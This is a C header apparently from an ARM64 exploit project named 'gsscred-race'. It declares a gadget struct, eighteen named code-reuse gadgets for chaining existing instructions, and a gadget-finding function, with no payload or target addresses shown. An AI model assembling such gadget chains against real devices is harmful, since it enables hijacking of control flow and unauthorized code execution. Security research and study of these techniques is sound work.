#ifndef GSSCRED_RACE__ARM64__GADGETS_H_
#define GSSCRED_RACE__ARM64__GADGETS_H_

#include <stdint.h>
#include <stdlib.h>

// Represents a static gadget.
struct gadget {
	// The runtime address of the gadget.
	uint64_t address;
	// The number of instructions in the gadget.
	const uint32_t count;
	// The sequence of instructions in the gadget.
	const uint32_t *const ins;
	// A string representation of the gadget. Mostly useful for debugging.
	const char *const str;
};

// The list of static gadgets.
extern struct gadget gadgets[];

// Named indices for the gadgets.
enum {
	LDP_X1_X0_X0_20__BR_X1,
	LDP_X8_X2_X19__BLR_X8,
	LDP_X3_X2_X2__BR_X3,
	ADD_X1_X21_X20__BLR_X8,

	MOV_X20_X1_BLR_X8,
	STR_X1_X19_80__BLR_X8,
	MOV_X0_X26__BLR_X8,
	SUB_X1_X1_X0__BLR_X8,

	MOV_X13_X1__BR_X8,
	MOV_X9_X13__BR_X8,
	MOV_X11_X24__BR_X8,
	CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8,

	MOV_X9_X22__BR_X8,
	CSEL_X2_X11_X9_LT__BLR_X8,
	MOV_X0_X27__BLR_X8,
	BLR_X23__MOV_X0_X21__BLR_X25,

	LDR_X8_X19_10__BLR_X8,
	BLR_X8,

	GADGET_COUNT
};

// Process the given region of code to try and find all the gadgets above.
void find_gadgets(uint64_t address, const void *code, size_t size);

#endif
